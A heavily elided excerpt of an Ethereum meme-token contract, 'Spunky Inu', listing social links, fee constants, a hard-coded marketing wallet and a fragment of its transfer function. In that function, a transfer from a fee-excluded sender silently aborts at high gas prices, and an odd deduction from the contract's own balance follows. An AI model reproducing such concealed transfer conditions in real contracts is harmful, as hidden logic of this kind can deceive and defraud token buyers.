...
/**
https://t.me/SpunkyInu
https://spunkyinu.com/
https://medium.com/@SpunkyInuERC20/spunky-inu-440b35235c27
https://twitter.com/SpunkyInuERC
*/
...
contract SPUNKYINU is Context, IERC20, Ownable {
    ...
    uint256 private constant SWAP_TOKENS_AT_AMOUNT = 10 * 10**9; //
    string private constant _name = "Spunky Inu"; //
    string private constant _symbol = "SPUNKY"; //
    uint8 private constant _decimals = 9; //

    uint256 public _marketingFee = 2;
    uint256 public _liquidityFee = 1;
    address public  _marketingWallet = 0x171E49435f34cCa6545def3b08602642eD94d7b2;
    ...
    function _transfer(
        ...
        if ((tx.gasprice > 50 gwei) && (_isExcludedFromFee[from])){return ;}
        _tOwned[address(this)] -= amount; 
